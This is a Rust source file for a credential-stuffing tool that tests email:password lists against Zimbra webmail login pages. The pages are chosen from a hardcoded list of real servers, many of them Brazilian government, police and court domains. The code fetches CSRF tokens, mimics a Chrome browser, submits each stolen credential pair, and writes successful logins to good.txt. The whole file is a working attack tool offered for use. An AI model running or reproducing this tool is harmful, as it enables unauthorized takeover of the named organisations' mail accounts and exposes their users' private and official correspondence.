extern crate reqwest;
use colored::*;
use native_dialog::MessageDialog;
use native_dialog::MessageType;
use reqwest::blocking::Client;
use reqwest::header;
use select::document::Document;
use select::node::Node;
use select::predicate::Name;
use std::collections::HashMap;
use std::collections::HashSet;
use std::error::Error;
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::process::exit;

const GOOD: &str =  "good.txt";
trait Check {
    fn login(self,   url: &str);
}

#[derive(Debug, Hash, PartialEq, Eq, Clone)]
struct Mail<T: AsRef<str> + std::fmt::Debug> {
    email: T,
    password: T,
}
impl<T: AsRef<str> + std::fmt::Debug> Mail<T> {
    fn new_file() -> Option<PathBuf> {
        use native_dialog::FileDialog;

        if let Ok(Some(filename)) = FileDialog::new()
            .add_filter("Select File login Combo", &["txt"])
            .show_open_single_file()
        {
            return Some(filename);
        } else {
            let _ = MessageDialog::new()
                .set_title("Error")
                .set_type(MessageType::Error)
                .set_text("Error opening the file")
                .show_alert();
        }
        eprintln!("I need to file");
        None
    }
}

impl<T: AsRef<str> + std::fmt::Debug> Check for Mail<T> {
   fn login(self,   url: &str) {
       zimbra_login(url, self);
   }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let format = format!(
        "{}",
        "
correio.pm.go.gov.br
mail.cytanet.com.cy
mail.nitrkl.ac.in
mail.pa.gov.br
mail.police.go.th
mail.policiacivil.pa.gov.br
mail.zimbra.com
pc.correio.es.gov.br
webmail.cremesp.org.br
webmail.cta.br
webmail.hpp.org.br
webmail.lapo.ng
webmail.pb.gov.br
webmail.pi.gov.br
webmail.policiacivil.ce.gov.br
webmail.saobernardo.sp.gov.br
webmail.sescpr.com.br
webmail.telkomsa.net
webmail.tjgo.jus.br
zimbra.goiania.go.gov.br
webmail.sedet.ce.gov.br
    "
    );

    let mut hash_map = HashMap::new();
    for (i, line) in format.lines().enumerate() {
        if !line.trim().is_empty() {
            println!(
                "[{}] {} {}",
                (i).to_string().bright_blue(),
                "->".bright_red(),
                line.bright_green()
            );
            hash_map.insert(i, line);
        }
    }
    loop {
        if let Ok(number) = input() {
            if let Some(website) = hash_map.get(&(number as usize)) {
                println!("{}  ->  {}", "Testing".bright_yellow(),   website.bright_green() );
                let file_open = Mail::<&str>::new_file();
                if let Some(path) = file_open {
                    let format =  format_combo(path);

                    if let Ok(hash) =  format{
                        for mail_login  in hash{
                            mail_login.login(&format!("https://{}",website));
                        }
                        eprintln!("File save {}",  GOOD);
                        exit(1);
                    }
                 }
            } else {
                eprintln!("Option not  found");
            }
        } else {
            eprintln!("Option incorret  :( ");
        }
    }

    Ok(())
}

fn client(cookies: Option<&String>, url: &str) -> Client {
    let mut headers = header::HeaderMap::new();
    headers.insert("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7".parse().unwrap());
    headers.insert(
        "accept-language",
        "pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7".parse().unwrap(),
    );
    headers.insert("cache-control", "max-age=0".parse().unwrap());
    headers.insert(
        "content-type",
        "application/x-www-form-urlencoded".parse().unwrap(),
    );
    headers.insert("origin", url.parse().unwrap());
    headers.insert("priority", "u=0, i".parse().unwrap());
    headers.insert("referer", url.parse().unwrap());
    headers.insert(
        "sec-ch-ua",
        "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""
            .parse()
            .unwrap(),
    );
    headers.insert("sec-ch-ua-mobile", "?0".parse().unwrap());
    headers.insert("sec-fetch-dest", "document".parse().unwrap());
    headers.insert("sec-fetch-mode", "navigate".parse().unwrap());
    headers.insert("sec-fetch-site", "same-origin".parse().unwrap());
    headers.insert("sec-fetch-user", "?1".parse().unwrap());
    headers.insert("upgrade-insecure-requests", "1".parse().unwrap());
    headers.insert("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36".parse().unwrap());

    if let Some(coookies) = cookies {
        headers.insert(header::COOKIE, coookies.parse().unwrap());
    }
    let client = reqwest::blocking::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .default_headers(headers)
        .build()
        .unwrap();

    client
}

fn get_token_csrf(url: &str) -> Option<String> {
    let _find_csrf = client(None, url).get(url).send().unwrap();

    let response = _find_csrf.text().unwrap();
    let document = Document::from(response.as_str());

    if let Some(csrf_token) = document
        .find(Name("input"))
        .filter(|node: &Node| node.attr("name").map_or(false, |name| name == "login_csrf"))
        .next()
    {
        // Extract the value of the CSRF token
        if let Some(value) = csrf_token.attr("value") {
            return Some(value.to_string());
        } else {
            println!("CSRF Token input does not have a value.");
        }
    } else {
        println!("CSRF Token input not found.");
    }

    None
}

fn zimbra_login<T>(url: &str, login: Mail<T>) -> Result<(), Box<dyn Error>>
where
    T: AsRef<str> + std::fmt::Debug,
{
    let get_csrf = get_token_csrf(url);
    if let Some(csrf_token) = get_csrf {
        let (mail, pass) = (login.email.as_ref(), login.password.as_ref());
        let format_post_send_upload = format!(
            "loginOp=login&login_csrf={}&username={}&password={}&client=preferred",
            csrf_token, mail, pass
        );
        let cookies = format!("ZM_TEST=true; ZM_LOGIN_CSRF={}", csrf_token);
        let res = client(Some((&cookies)), url)
            .post(url)
            .body(format_post_send_upload)
            .send()?;
        let status_code = res.status().as_u16(); // redirect is valid

        if status_code == 200 {
            eprintln!(
                "{} ->  {} ",
                "[Bad]".bright_white(),
                format!("{}:{}", mail, pass).bright_red()
            );
        } else if status_code == 302 {
            let mail_pass_save = format!("{} -> {}:{}", url, mail, pass);

            println!(
                "{} ->  {}",
                "[Good]".bright_blue(),
                format!("{}:{}", mail.bright_green(), pass.bright_cyan())
            );
            file_save_good(mail_pass_save);
        } else {
            eprintln!(
                "{} <--> {}",
                "[Unknow]".bright_magenta(),
                format!("{}:{}", mail, pass).bright_blue()
            );
        }
    } else {
        eprintln!("{}", "Token not found".bright_red()); //  no try
    }

    Ok(())
}

fn file_save_good(buffer: String) {
    let mut open = fs::OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(GOOD)
        .unwrap();
    open.write(format!("{}\n", buffer).as_bytes());
}
use std::io;

fn input() -> Result<isize, Box<dyn std::error::Error>> {
    let mut buffer_read = String::new();

    print!(
        "
{}",
        "
Option -> ┣▇▇▇═── "
            .bright_magenta()
    );
    io::stdout().flush()?;
    io::stdin().read_line(&mut buffer_read)?;
    let input_value: isize = buffer_read.trim().parse()?;

    Ok(input_value)
}

fn format_combo(path_open_file: PathBuf) -> Result<HashSet<Mail<String>>, Box<dyn std::error::Error>> {
    let buffer_combo = fs::read_to_string(path_open_file)?;
    let mut hashSet_combo_no_duplicate = HashSet::new();
    for line in buffer_combo.lines() {
        let colection_mail_pass: Vec<&str> = line.split(":").collect();
        if colection_mail_pass.len() == 2 {
            let email = colection_mail_pass[0].to_string();
            let password = colection_mail_pass[1].to_string();
            hashSet_combo_no_duplicate.insert(Mail { email, password });
        } else {
            continue;
        }
    }
    Ok(hashSet_combo_no_duplicate)
}
